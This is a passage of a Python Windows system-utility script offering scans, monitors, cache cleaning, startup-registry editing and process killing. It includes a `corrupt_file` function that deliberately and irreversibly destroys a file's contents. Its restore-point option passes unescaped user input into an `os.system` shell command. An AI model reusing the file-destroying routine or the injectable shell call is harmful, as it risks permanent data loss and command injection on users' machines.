        print(f"{Fore.CYAN}Processing {len(all_files)} files in parallel...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            results = list(executor.map(scan_file, all_files))
            
            # Combine results
            for file_issues, size in results:
                total_size += size
                for category, items in file_issues.items():
                    if category in issues:
                        issues[category].extend(items)
    else:
        # Process files sequentially for smaller directories
        for file_path in all_files:
            file_issues, size = scan_file(file_path)
            total_size += size
            for category, items in file_issues.items():
                if category in issues:
                    issues[category].extend(items)
    
    # Add recommendations based on scan results
    if total_size > 1024**3:  # 1GB
        issues["recommendations"].append(
            f"Large directory ({humanize.naturalsize(total_size)}). "
            "Consider archiving old files."
        )
    
    if large_files:
        issues["recommendations"].append("Large files found:")
        for path, size in sorted(large_files, key=lambda x: x[1], reverse=True)[:5]:
            issues["recommendations"].append(
                f"  • {os.path.relpath(path, directory)}: {humanize.naturalsize(size)}"
            )
    
    if old_files:
        issues["recommendations"].append("Old files that might be archived:")
        for path, age in sorted(old_files, key=lambda x: x[1], reverse=True)[:5]:
            issues["recommendations"].append(
                f"  • {os.path.relpath(path, directory)}: {int(age)} days old"
            )
    
    if hidden_files:
        issues["recommendations"].append(f"Found {len(hidden_files)} hidden files")
    
    return issues

def check_permissions(path):
    """
    Check file or directory permissions
    
    Args:
        path (str): Path to check permissions for
        
    Returns:
        dict: Dictionary containing permission information
    """
    result = {
        "basic": {
            "read": False,
            "write": False,
            "execute": False,
            "delete": False
        },
        "owner": None,
        "attributes": []
    }
    
    try:
        # Check if path exists
        if not os.path.exists(path):
            return {"error": "Path does not exist"}
            
        # Basic permissions
        result["basic"]["read"] = os.access(path, os.R_OK)
        result["basic"]["write"] = os.access(path, os.W_OK)
        result["basic"]["execute"] = os.access(path, os.X_OK)
        
        # Windows-specific permissions
        if os.name == 'nt':
            try:
                # Get owner
                sd = win32security.GetFileSecurity(
                    path, win32security.OWNER_SECURITY_INFORMATION)
                owner_sid = sd.GetSecurityDescriptorOwner()
                name, domain, type = win32security.LookupAccountSid(None, owner_sid)
                result["owner"] = f"{domain}\\{name}"
                
                # Get file attributes
                attrs = win32api.GetFileAttributes(path)
                if attrs & win32con.FILE_ATTRIBUTE_READONLY:
                    result["attributes"].append("Read-only")
                if attrs & win32con.FILE_ATTRIBUTE_HIDDEN:
                    result["attributes"].append("Hidden")
                if attrs & win32con.FILE_ATTRIBUTE_SYSTEM:
                    result["attributes"].append("System")
                if attrs & win32con.FILE_ATTRIBUTE_ARCHIVE:
                    result["attributes"].append("Archive")
                if attrs & win32con.FILE_ATTRIBUTE_COMPRESSED:
                    result["attributes"].append("Compressed")
                if attrs & win32con.FILE_ATTRIBUTE_ENCRYPTED:
                    result["attributes"].append("Encrypted")
                    
                # Check delete permission
                try:
                    # Try to get delete permission without actually deleting
                    sd = win32security.GetFileSecurity(
                        path, win32security.DELETE)
                    result["basic"]["delete"] = True
                except:
                    result["basic"]["delete"] = False
            except Exception as e:
                result["error"] = f"Windows permission error: {str(e)}"
        
        return result
        
    except Exception as e:
        return {"error": f"Permission check error: {str(e)}"}

def get_permission_string(access_mask):
    perms = []
    if access_mask & win32con.FILE_READ_DATA: perms.append("Read")
    if access_mask & win32con.FILE_WRITE_DATA: perms.append("Write")
    if access_mask & win32con.FILE_EXECUTE: perms.append("Execute")
    if access_mask & win32con.DELETE: perms.append("Delete")
    if access_mask & win32con.WRITE_DAC: perms.append("Change Permissions")
    if access_mask & win32con.WRITE_OWNER: perms.append("Take Ownership")
    return ", ".join(perms) if perms else "No Access"

def disk_health_check():
    """
    Perform a comprehensive disk health check
    
    Returns:
        dict: Dictionary containing disk health information
    """
    results = {
        "space_usage": {},
        "performance": {},
        "warnings": [],
        "errors": []
    }
    
    try:
        # Check disk space
        for partition in psutil.disk_partitions():
            if 'fixed' in partition.opts:
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    results["space_usage"][partition.mountpoint] = {
                        "total": usage.total,
                        "used": usage.used,
                        "free": usage.free,
                        "percent_used": usage.percent
                    }
                    
                    # Add warnings for low disk space
                    if usage.percent > 90:
                        results["warnings"].append(
                            f"Low disk space on {partition.mountpoint}: {usage.percent}% used"
                        )
                except Exception as e:
                    results["errors"].append(f"Error checking {partition.mountpoint}: {str(e)}")
        
        # Check disk performance (Windows only)
        if os.name == 'nt':
            try:
                # Check disk status
                status_output = subprocess.check_output(
                    ["wmic", "diskdrive", "get", "status"], 
                    universal_newlines=True
                )
                status_lines = status_output.strip().split('\n')[1:]
                if any(status != "OK" for status in status_lines if status.strip()):
                    results["errors"].append("Disk hardware issues detected")
                results["performance"]["disk_status"] = "OK" if all(
                    status == "OK" for status in status_lines if status.strip()
                ) else "Issues detected"
                
                # Check fragmentation (simplified)
                results["performance"]["fragmentation"] = "Unknown (run defrag for details)"
                
                # Simple disk speed test
                try:
                    # Write test
                    test_file = os.path.join(os.environ.get('TEMP', '.'), 'disk_test.tmp')
                    start_time = time.time()
                    with open(test_file, 'wb') as f:
                        f.write(os.urandom(50 * 1024 * 1024))  # 50MB test file
                    write_time = time.time() - start_time
                    write_speed = 50 / write_time  # MB/s
                    
                    # Read test
                    start_time = time.time()
                    with open(test_file, 'rb') as f:
                        f.read()
                    read_time = time.time() - start_time
                    read_speed = 50 / read_time  # MB/s
                    
                    # Clean up
                    os.remove(test_file)
                    
                    results["performance"]["write_speed"] = f"{write_speed:.1f} MB/s"
                    results["performance"]["read_speed"] = f"{read_speed:.1f} MB/s"
                    
                    if write_speed < 10 or read_speed < 20:
                        results["warnings"].append("Slow disk performance detected")
                        
                except Exception as e:
                    results["warnings"].append(f"Could not test disk speed: {str(e)}")
                    
            except Exception as e:
                results["warnings"].append(f"Could not check disk status: {str(e)}")
        
        return results
        
    except Exception as e:
        results["errors"].append(f"Disk health check error: {str(e)}")
        return results

def clean_cache():
    """
    Clean temporary files and directories from system cache locations.
    
    Returns:
        tuple: (int, list) Number of items cleaned and list of errors
    """
    cleaned = 0
    errors = []
    
    # Define paths to clean based on OS
    if os.name == 'nt':  # Windows
        paths_to_clean = list(filter(None, [
            os.environ.get('TEMP'),
            os.environ.get('TMP'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Temp'),
            os.path.join(os.environ.get('WINDIR', ''), 'Temp')
        ]))
    else:  # Unix/Linux/Mac
        paths_to_clean = [
            '/tmp',
            os.path.expanduser('~/.cache')
        ]
    
    # Safe file extensions that should not be deleted
    protected_exts = ['.dll', '.pyd', '.exe', '.so', '.dylib']
    
    # Safe directory patterns that should be skipped
    protected_dirs = ['_MEI', 'pywin32_system32', 'chrome-remote-desktop']
    
    for path in paths_to_clean:
        if not path or not os.path.exists(path):
            continue
            
        print(f"{Fore.YELLOW}Cleaning {path}...")
        
        try:
            # Use tqdm for progress if there are many files
            file_count = sum([len(files) for _, _, files in os.walk(path)])
            if file_count > 100:
                print(f"Found {file_count} files to process")
            
            for root, dirs, files in os.walk(path, topdown=False):
                # Skip protected directories
                if any(skip in root for skip in protected_dirs):
                    continue
                    
                # Remove files first
                for name in files:
                    try:
                        filepath = os.path.join(root, name)
                        file_ext = os.path.splitext(filepath)[1].lower()
                        
                        # Skip protected file types
                        if file_ext in protected_exts:
                            continue
                            
                        # Skip files in use
                        if os.path.exists(filepath):
                            try:
                                # Try to open the file to see if it's locked
                                with open(filepath, 'a'):
                                    pass
                                # If we get here, file is not locked
                                os.unlink(filepath)
                                cleaned += 1
                            except (PermissionError, OSError):
                                # File is in use or protected
                                continue
                    except Exception as e:
                        errors.append(f"Error deleting {name}: {str(e)}")
                
                # Then try to remove empty directories
                for name in dirs:
                    try:
                        dirpath = os.path.join(root, name)
                        if os.path.exists(dirpath) and not os.listdir(dirpath):
                            os.rmdir(dirpath)
                            cleaned += 1
                    except Exception as e:
                        errors.append(f"Error removing directory {name}: {str(e)}")
        
        except Exception as e:
            errors.append(f"Error processing {path}: {str(e)}")
    
    return cleaned, errors

def monitor_directory(directory):
    class FileHandler(FileSystemEventHandler):
        def __init__(self):
            self.last_modified = {}
            
        def on_created(self, event):
            if not event.is_directory:
                path = event.src_path
                size = os.path.getsize(path) if os.path.exists(path) else 0
                print(f"{Fore.GREEN}+ File created: {path} ({humanize.naturalsize(size)})")

        def on_modified(self, event):
            if not event.is_directory:
                path = event.src_path
                now = time.time()
                
                if path in self.last_modified:
                    if now - self.last_modified[path] < 1:
                        return
                
                self.last_modified[path] = now
                if os.path.exists(path):
                    size = os.path.getsize(path)
                    print(f"{Fore.YELLOW}~ File modified: {path} ({humanize.naturalsize(size)})")

        def on_deleted(self, event):
            if not event.is_directory:
                print(f"{Fore.RED}- File deleted: {event.src_path}")

        def on_moved(self, event):
            if not event.is_directory:
                print(f"{Fore.BLUE}→ File moved/renamed:")
                print(f"  From: {event.src_path}")
                print(f"  To: {event.dest_path}")

    print(f"{Fore.CYAN}Starting directory monitor for: {directory}")
    print(f"{Fore.YELLOW}Events that will be detected:")
    print(f"{Fore.GREEN}• File creation")
    print(f"{Fore.YELLOW}• File modification")
    print(f"{Fore.RED}• File deletion")
    print(f"{Fore.BLUE}• File moving/renaming")
    print(f"\n{Fore.WHITE}Press Ctrl+C to stop monitoring...")

    observer = Observer()
    handler = FileHandler()
    observer.schedule(handler, directory, recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
        print(f"\n{Fore.YELLOW}Monitoring stopped.")
    observer.join()

def file_stats():
    stats = {
        "types": {},
        "sizes": {"small": 0, "medium": 0, "large": 0},
        "ages": {"today": 0, "week": 0, "month": 0, "older": 0},
        "total_size": 0,
        "count": 0
    }
    
    now = time.time()
    for f in os.listdir():
        if os.path.isfile(f):
            stats["count"] += 1
            ext = os.path.splitext(f)[1].lower() or "no_extension"
            stats["types"][ext] = stats["types"].get(ext, 0) + 1
            
            size = os.path.getsize(f)
            stats["total_size"] += size
            if size < 1024*1024:
                stats["sizes"]["small"] += 1
            elif size < 100*1024*1024:
                stats["sizes"]["medium"] += 1
            else:
                stats["sizes"]["large"] += 1
            
            age = now - os.path.getmtime(f)
            if age < 86400:
                stats["ages"]["today"] += 1
            elif age < 604800:
                stats["ages"]["week"] += 1
            elif age < 2592000:
                stats["ages"]["month"] += 1
            else:
                stats["ages"]["older"] += 1
    
    return stats

def screen_capture():
    try:
        pictures_dir = os.path.join(os.path.expanduser('~'), 'Pictures', 'Multitool Screenshots')
        os.makedirs(pictures_dir, exist_ok=True)
        
        print(f"{Fore.CYAN}Screen Capture Options:")
        print(f"{Fore.YELLOW}1. Full screen")
        print(f"{Fore.YELLOW}2. Active window")
        print(f"{Fore.YELLOW}3. Cancel")
        
        choice = input(f"\n{Fore.GREEN}Choose option (1-3): {Fore.WHITE}")
        
        if choice == '3':
            return
            
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(pictures_dir, f'screenshot_{timestamp}.png')
        
        if choice == '1':
            print(f"{Fore.YELLOW}Taking full screen screenshot in 3 seconds...")
            print(f"{Fore.YELLOW}Switch to the window you want to capture...")
            time.sleep(3)
            screenshot = pyautogui.screenshot()
            
        elif choice == '2':
            try:
                print(f"{Fore.YELLOW}Capturing active window in 3 seconds...")
                print(f"{Fore.YELLOW}Make sure your target window is active...")
                time.sleep(3)
                
                import win32gui
                hwnd = win32gui.GetForegroundWindow()
                rect = win32gui.GetWindowRect(hwnd)
                region = (rect[0], rect[1], rect[2] - rect[0], rect[3] - rect[1])
                screenshot = pyautogui.screenshot(region=region)
            except Exception as e:
                print(f"{Fore.RED}Error capturing active window: {e}")
                print(f"{Fore.YELLOW}Falling back to full screen...")
                screenshot = pyautogui.screenshot()
        else:
            print(f"{Fore.RED}Invalid choice!")
            return
        
        screenshot.save(filename)
        
        size = os.path.getsize(filename)
        
        print(f"\n{Fore.GREEN}Screenshot saved successfully!")
        print(f"{Fore.CYAN}Location: {Fore.WHITE}{filename}")
        print(f"{Fore.CYAN}Size: {Fore.WHITE}{humanize.naturalsize(size)}")
        print(f"{Fore.CYAN}Dimensions: {Fore.WHITE}{screenshot.size[0]}x{screenshot.size[1]} pixels")
        
        if input(f"\n{Fore.YELLOW}Open screenshots folder? (y/n): {Fore.WHITE}").lower() == 'y':
            os.startfile(pictures_dir)
            
    except Exception as e:
        print(f"{Fore.RED}Error taking screenshot: {str(e)}")
        print(f"{Fore.YELLOW}Tips:")
        print(f"{Fore.WHITE}- Make sure you have permission to save files")
        print(f"{Fore.WHITE}- Try running the program as administrator")

def clean_filenames():
    pattern = re.compile(r'[^\w\-_\. ]')
    renamed = 0
    
    for filename in os.listdir():
        if os.path.isfile(filename):
            name, ext = os.path.splitext(filename)
            new_name = pattern.sub('', name)
            new_name = ' '.join(new_name.split())
            new_name = f"{new_name}{ext}"
            
            if new_name != filename:
                try:
                    os.rename(filename, new_name)
                    renamed += 1
                    print(f"{Fore.GREEN}Cleaned: {filename} → {new_name}")
                except Exception as e:
                    print(f"{Fore.RED}Error renaming {filename}: {e}")
    
    return renamed

def corrupt_file(filepath):
    """Deliberately corrupts a file by randomly modifying bytes"""
    try:
        if not os.path.exists(filepath):
            print(f"{Fore.RED}File not found!")
            return False
            
        print(f"{Fore.RED}!!! WARNING !!!")
        print(f"{Fore.RED}This will PERMANENTLY corrupt the file with NO WAY to recover it!")
        print(f"{Fore.RED}File: {Fore.WHITE}{filepath}")
        print(f"{Fore.RED}There will be NO backup created. The file will be permanently damaged.")
        confirm = input(f"{Fore.RED}Type 'DESTROY' to confirm permanent file corruption: {Fore.CYAN}")
        
        if confirm != 'DESTROY':
            print(f"{Fore.GREEN}Operation cancelled.")
            return False
        
        filesize = os.path.getsize(filepath)
        with open(filepath, 'rb+') as f:
            corrupt_bytes = max(int(filesize * 0.5), 1)
            for _ in range(corrupt_bytes):
                pos = random.randint(0, filesize-1)
                f.seek(pos)
                f.write(os.urandom(1))
                
        print(f"{Fore.GREEN}File has been corrupted successfully.")
        print(f"{Fore.RED}The file is now permanently damaged.")
        return True
        
    except Exception as e:
        print(f"{Fore.RED}Error corrupting file: {str(e)}")
        return False

def monitor_network():
    """Enhanced network traffic monitoring with detailed stats"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.CYAN}Enhanced Network Monitor (Press Ctrl+C to exit)")
        print(f"{Fore.CYAN}{'=' * 60}")
        
        old_stats = psutil.net_io_counters()
        start_time = time.time()
        
        while True:
            new_stats = psutil.net_io_counters()
            current_time = time.time()
            elapsed = current_time - start_time
            
            bytes_sent = new_stats.bytes_sent - old_stats.bytes_sent
            bytes_recv = new_stats.bytes_recv - old_stats.bytes_recv
            packets_sent = new_stats.packets_sent - old_stats.packets_sent
            packets_recv = new_stats.packets_recv - old_stats.packets_recv
            
            connections = psutil.net_connections(kind='inet')
            active_conns = len([c for c in connections if c.status == 'ESTABLISHED'])
            listening_ports = len([c for c in connections if c.status == 'LISTEN'])
            
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{Fore.CYAN}Network Monitor (Press Ctrl+C to exit)")
            print(f"{Fore.CYAN}{'=' * 60}")
            
            print(f"\n{Fore.YELLOW}Current Speeds:")
            print(f"{Fore.WHITE}Upload:   {humanize.naturalsize(bytes_sent)}/s")
            print(f"{Fore.WHITE}Download: {humanize.naturalsize(bytes_recv)}/s")
            
            print(f"\n{Fore.YELLOW}Packet Statistics:")
            print(f"{Fore.WHITE}Packets Sent:     {packets_sent:,} packets")
            print(f"{Fore.WHITE}Packets Received: {packets_recv:,} packets")
            
            print(f"\n{Fore.YELLOW}Total Transfer:")
            print(f"{Fore.WHITE}Total Upload:   {humanize.naturalsize(new_stats.bytes_sent)}")
            print(f"{Fore.WHITE}Total Download: {humanize.naturalsize(new_stats.bytes_recv)}")
            
            print(f"\n{Fore.YELLOW}Network Status:")
            print(f"{Fore.WHITE}Active Connections: {active_conns}")
            print(f"{Fore.WHITE}Listening Ports:    {listening_ports}")
            
            interfaces = psutil.net_if_stats()
            print(f"\n{Fore.YELLOW}Network Interfaces:")
            for iface, stats in interfaces.items():
                status = f"{Fore.GREEN}Up" if stats.isup else f"{Fore.RED}Down"
                print(f"{Fore.WHITE}{iface}: {status}{Fore.WHITE} (Speed: {stats.speed}Mb/s)")
            
            print(f"\n{Fore.CYAN}Monitor running for: {timedelta(seconds=int(elapsed))}")
            
            old_stats = new_stats
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Monitoring stopped.")

def system_resources():
    """Enhanced system resource overview"""
    try:
        print(f"{Fore.CYAN}System Resource Overview (Static Snapshot)")
        print(f"{Fore.CYAN}{'=' * 60}\n")
        
        cpu_count = psutil.cpu_count()
        cpu_count = psutil.cpu_count()
        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_freq = psutil.cpu_freq()
        print(f"{Fore.YELLOW}CPU Information:")
        print(f"{Fore.WHITE}Cores/Threads: {cpu_count} logical processors")
        print(f"{Fore.WHITE}Current Usage: {cpu_percent}%")
        if cpu_freq:
            print(f"{Fore.WHITE}Frequency: {cpu_freq.current/1000:.1f}GHz (Max: {cpu_freq.max/1000:.1f}GHz)")
        
        mem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        print(f"\n{Fore.YELLOW}Memory Usage:")
        print(f"{Fore.WHITE}RAM: {humanize.naturalsize(mem.used)} used of {humanize.naturalsize(mem.total)} ({mem.percent}%)")
        print(f"{Fore.WHITE}Swap: {humanize.naturalsize(swap.used)} used of {humanize.naturalsize(swap.total)} ({swap.percent}%)")
        
        try:
            temps = psutil.sensors_temperatures()
            if temps:
                print(f"\n{Fore.YELLOW}Temperature Sensors:")
                for name, entries in temps.items():
                    for entry in entries:
                        print(f"{Fore.WHITE}{name}: {entry.current}°C")
        except:
            pass
            
        processes = len(list(psutil.process_iter()))
        threads = sum(p.num_threads() for p in psutil.process_iter())
        print(f"\n{Fore.YELLOW}Process Information:")
        print(f"{Fore.WHITE}Active Processes: {processes}")
        print(f"{Fore.WHITE}Total Threads: {threads}")
        
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        print(f"\n{Fore.YELLOW}System Uptime:")
        print(f"{Fore.WHITE}Boot Time: {boot_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.WHITE}Up for: {str(uptime).split('.')[0]}")
        
        print(f"\n{Fore.YELLOW}Note: This is a static snapshot. Press any key to exit.")
        keyboard.read_event()
        
    except Exception as e:
        print(f"{Fore.RED}Error getting system resources: {str(e)}")

def monitor_services():
    try:
        import win32serviceutil
        import win32service
        
        print(f"{Fore.CYAN}Windows Services Monitor")
        print(f"{Fore.CYAN}{'=' * 60}\n")
        
        services = []
        accessSCM = win32con.GENERIC_READ
        sc_handle = win32service.OpenSCManager(None, None, accessSCM)
        
        try:
            type_filter = win32service.SERVICE_WIN32
            state_filter = win32service.SERVICE_STATE_ALL
            
            serv_status = win32service.EnumServicesStatus(sc_handle, type_filter, state_filter)
            
            for service in serv_status:
                services.append({
                    'name': service[0],
                    'display_name': service[1],
                    'status': service[2],
                    'status_code': service[2][1]
                })
                
            running = []
            stopped = []
            
            for service in services:
                if service['status_code'] == win32service.SERVICE_RUNNING:
                    running.append(service)
                elif service['status_code'] == win32service.SERVICE_STOPPED:
                    stopped.append(service)
            
            print(f"{Fore.GREEN}Running Services: {len(running)}")
            for svc in sorted(running, key=lambda x: x['display_name'])[:10]:
                print(f"{Fore.WHITE}• {svc['display_name']}")
            
            print(f"\n{Fore.RED}Stopped Services: {len(stopped)}")
            for svc in sorted(stopped, key=lambda x: x['display_name'])[:5]:
                print(f"{Fore.WHITE}• {svc['display_name']}")
                
            print(f"\n{Fore.YELLOW}Service Statistics:")
            print(f"{Fore.WHITE}Total Services: {len(services)}")
            print(f"{Fore.WHITE}Running: {len(running)}")
            print(f"{Fore.WHITE}Stopped: {len(stopped)}")
            print(f"{Fore.WHITE}Other States: {len(services) - len(running) - len(stopped)}")
            
        finally:
            win32service.CloseServiceHandle(sc_handle)
            
    except Exception as e:
        print(f"{Fore.RED}Error accessing services: {str(e)}")
        print(f"{Fore.YELLOW}Note: This feature requires administrator privileges")
    
    input(f"\n{Fore.CYAN}Press Enter to continue...")

def monitor_processes():
    """Monitor system processes with CPU and memory usage"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\033[?25l")
        print(f"{Fore.CYAN}Process Monitor (Press Ctrl+C to exit)")
        print(f"{Fore.CYAN}{'Process':<30} {'CPU %':>8} {'Memory MB':>12} {'Status':>8}")
        print(f"{Fore.CYAN}{'=' * 60}")
        
        while True:
            print("\033[H\033[4B", end='')
            
            processes = []
            for proc in psutil.process_iter(['name', 'cpu_percent', 'memory_info', 'status']):
                try:
                    processes.append({
                        'name': proc.info['name'],
                        'cpu': proc.info['cpu_percent'],
                        'memory': proc.info['memory_info'].rss / 1024 / 1024,
                        'status': proc.info['status']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
            processes.sort(key=lambda x: x['cpu'], reverse=True)
            
            print("\033[J", end='')
            
            for proc in processes[:15]:
                name = proc['name'][:30]
                print(f"{Fore.WHITE}{name:<30} {Fore.YELLOW}{proc['cpu']:>7.1f}% "
                      f"{Fore.GREEN}{proc['memory']:>10.1f}MB {Fore.CYAN}{proc['status']:>8}")
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\033[?25h")
        print(f"\n{Fore.YELLOW}Monitoring stopped.")

def force_admin():
    """Check and request admin privileges"""
    import ctypes, sys
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True

        # Automatically elevate without spawning new window
        script = os.path.abspath(sys.argv[0])
        args = ' '.join(sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
        sys.exit()
    except Exception as e:
        print(f"Error requesting admin: {e}")
        return False

def manage_startup():
    """Manage Windows startup programs"""
    try:
        import winreg
        print(f"{Fore.CYAN}Startup Programs Manager")
        print(f"{Fore.CYAN}{'=' * 60}\n")
        
        startup_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, 
            winreg.KEY_ALL_ACCESS)
        
        programs = []
        try:
            i = 0
            while True:
                name, _, _ = winreg.EnumValue(startup_key, i)
                programs.append(name)
                i += 1
        except WindowsError:
            pass
        
        print(f"{Fore.YELLOW}Current Startup Programs:")
        if programs:
            for i, name in enumerate(programs, 1):
                print(f"{Fore.WHITE}{i}. {name}")
        else:
            print(f"{Fore.WHITE}No startup programs found")
            
        print(f"\n{Fore.YELLOW}Options:")
        print(f"{Fore.WHITE}1. Add program")
        print(f"{Fore.WHITE}2. Remove program")
        print(f"{Fore.WHITE}3. Exit")
        
        choice = input(f"\n{Fore.GREEN}Choose option (1-3): {Fore.WHITE}")
        
        if choice == "1":
            name = input(f"{Fore.YELLOW}Enter program name: {Fore.WHITE}")
            path = input(f"{Fore.YELLOW}Enter full program path: {Fore.WHITE}")
            winreg.SetValueEx(startup_key, name, 0, winreg.REG_SZ, path)
            print(f"{Fore.GREEN}Program added to startup!")
            
        elif choice == "2":
            if programs:
                idx = int(input(f"{Fore.YELLOW}Enter program number to remove: {Fore.WHITE}")) - 1
                if 0 <= idx < len(programs):
                    winreg.DeleteValue(startup_key, programs[idx])
                    print(f"{Fore.GREEN}Program removed from startup!")
            else:
                print(f"{Fore.RED}No programs to remove")
                
        winreg.CloseKey(startup_key)
        
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")
        print(f"{Fore.YELLOW}This feature requires administrator privileges")

def system_restore():
    """Create and manage system restore points"""
    try:
        import win32com.client
        print(f"{Fore.CYAN}System Restore Manager")
        print(f"{Fore.CYAN}{'=' * 60}\n")

        shell = win32com.client.Dispatch("WScript.Shell")
        system = win32com.client.Dispatch("Microsoft.Update.SystemInfo")
        
        print(f"{Fore.YELLOW}System Restore Options:")
        print(f"{Fore.WHITE}1. Create restore point")
        print(f"{Fore.WHITE}2. Open System Restore")
        print(f"{Fore.WHITE}3. Exit")
        
        choice = input(f"\n{Fore.GREEN}Choose option (1-3): {Fore.WHITE}")
        
        if choice == "1":
            desc = input(f"{Fore.YELLOW}Enter description for restore point: {Fore.WHITE}")
            os.system(f'wmic.exe /Namespace:\\\\root\\default Path SystemRestore Call CreateRestorePoint "{desc}", 100, 7')
            print(f"{Fore.GREEN}Restore point created successfully!")
            
        elif choice == "2":
            os.system('rstrui.exe')
            print(f"{Fore.GREEN}System Restore window opened.")
            
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")
        print(f"{Fore.YELLOW}This feature requires administrator privileges")

def process_explorer():
    """Interactive process explorer with detailed info"""
    try:
        while True:
            clear_screen()
            print(f"{Fore.CYAN}Process Explorer")
            print(f"{Fore.CYAN}{'=' * 60}\n")
            
            # Create a dict to store parent process information
            parent_processes = {}
            
            # First collect all processes
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info', 'create_time', 'status', 'ppid']):
                try:
                    if proc.pid == 0 or proc.name().lower() == "system idle process":
                        continue
                        
                    # Get parent PID
                    ppid = proc.info['ppid']
                    
                    # If it's a parent process (no parent or parent not found)
                    if ppid == 0 or ppid not in parent_processes:
                        cpu = proc.cpu_percent() / psutil.cpu_count()
                        parent_processes[proc.pid] = {
                            'pid': proc.pid,
                            'name': proc.name(),
                            'cpu': cpu,
                            'memory': proc.memory_info().rss / 1024 / 1024,
                            'time': datetime.fromtimestamp(proc.create_time()).strftime('%H:%M:%S'),
                            'status': proc.status(),
                            'children_cpu': 0,
                            'children_memory': 0
                        }
                    else:
                        # Add child process resources to parent
                        cpu = proc.cpu_percent() / psutil.cpu_count()
                        parent_processes[ppid]['children_cpu'] += cpu
                        parent_processes[ppid]['children_memory'] += proc.memory_info().rss / 1024 / 1024
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # Create final process list with combined resources
            process_list = []
            for proc in parent_processes.values():
                total_cpu = min(proc['cpu'] + proc['children_cpu'], 100.0)
                total_memory = proc['memory'] + proc['children_memory']
                
                process_list.append({
                    'pid': proc['pid'],
                    'name': proc['name'],
                    'cpu': total_cpu,
                    'memory': total_memory,
                    'time': proc['time'],
                    'status': proc['status']
                })
            
            # Sort by total CPU usage
            process_list.sort(key=lambda x: x['cpu'], reverse=True)
            
            print(f"\n{Fore.YELLOW}Top Processes by CPU Usage (including subprocesses):")
            print(f"{Fore.CYAN}{'PID':>6} {'Name':<20} {'CPU%':>6} {'Memory':>10} {'Started':>10} {'Status':<8}")
            print(f"{Fore.CYAN}{'-' * 65}")
            
            for proc in process_list[:10]:
                print(f"{Fore.WHITE}{proc['pid']:>6} {proc['name'][:20]:<20} {proc['cpu']:>6.1f} "
                      f"{proc['memory']:>9.1f}M {proc['time']:>10} {proc['status']:<8}")
            
            print(f"\n{Fore.YELLOW}Options:")
            print(f"{Fore.WHITE}1. Refresh")
            print(f"{Fore.WHITE}2. Kill process (and children)")
            print(f"{Fore.WHITE}3. Process details")
            print(f"{Fore.WHITE}4. Exit")
            
            choice = input(f"\n{Fore.GREEN}Choose option (1-4): {Fore.WHITE}")
            
            if choice == "1":
                continue
                    
            elif choice == "2":
                pid = input(f"{Fore.YELLOW}Enter PID to terminate: {Fore.WHITE}")
                try:
                    parent = psutil.Process(int(pid))
                    # Get all child processes
                    children = parent.children(recursive=True)
                    # Terminate children first
                    for child in children:
                        try:
                            child.terminate()
                        except:
                            try:
                                child.kill()
                            except:
                                pass
                    # Terminate parent
                    parent.terminate()
                    print(f"{Fore.GREEN}Process and all subprocesses terminated successfully!")
                except:
                    print(f"{Fore.RED}Failed to terminate process")
                input(f"\n{Fore.CYAN}Press Enter to continue...")
                    
            elif choice == "3":
                pid = input(f"{Fore.YELLOW}Enter PID for details: {Fore.WHITE}")
                try:
                    proc = psutil.Process(int(pid))
                    children = proc.children(recursive=True)
                    
                    print(f"\n{Fore.GREEN}Process Details:")
                    print(f"{Fore.WHITE}Name: {proc.name()}")
                    print(f"\nChild Processes: {len(children)}")
                    for child in children:
                            try:
                                print(f"  • {child.name()} (PID: {child.pid})")
                            except:
                                continue
                    print("\nConnections:")
                    for conn in proc.connections():
                        print(f"  {conn.laddr} -> {conn.raddr if conn.raddr else '*'} ({conn.status})")
                except:
                    print(f"{Fore.RED}Could not get process details")
                input(f"\n{Fore.CYAN}Press Enter to continue...")
            
            elif choice == "4":
                break

    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")
        input(f"\n{Fore.CYAN}Press Enter to continue...")

def advanced_search():
    try:
        current_dir = os.getcwd()
        clear_screen()
        print(f"{Fore.CYAN}Advanced File Search")
        print(f"{Fore.CYAN}{'=' * 60}\n")
        
        print(f"{Fore.YELLOW}Current search directory: {Fore.WHITE}{current_dir}")
        print(f"{Fore.YELLOW}Tip: {Fore.WHITE}You can change directory using option 1 in the main menu\n")
        
        print(f"{Fore.YELLOW}Search Options:")
        print(f"{Fore.WHITE}1. Search by pattern/name")
        print(f"{Fore.WHITE}2. Search by size range")
        print(f"{Fore.WHITE}3. Search by date modified")
        print(f"{Fore.WHITE}4. Search by content (text files)")
        print(f"{Fore.WHITE}5. Exit")
        
        choice = input(f"\n{Fore.GREEN}Choose option (1-5): {Fore.WHITE}")
        
        results = []
        if choice == "1":
            print(f"\n{Fore.CYAN}Pattern Search Tips:")
            print(f"{Fore.WHITE}* = matches any characters")
            print(f"{Fore.WHITE}? = matches single character")
            print(f"{Fore.WHITE}Examples:")
            print(f"  *.txt       = all text files")
            print(f"  test*.doc   = all Word docs starting with 'test'")
            print(f"  backup_???  = files like 'backup_001', 'backup_v2', etc")
            pattern = input(f"\n{Fore.YELLOW}Enter search pattern: {Fore.WHITE}")
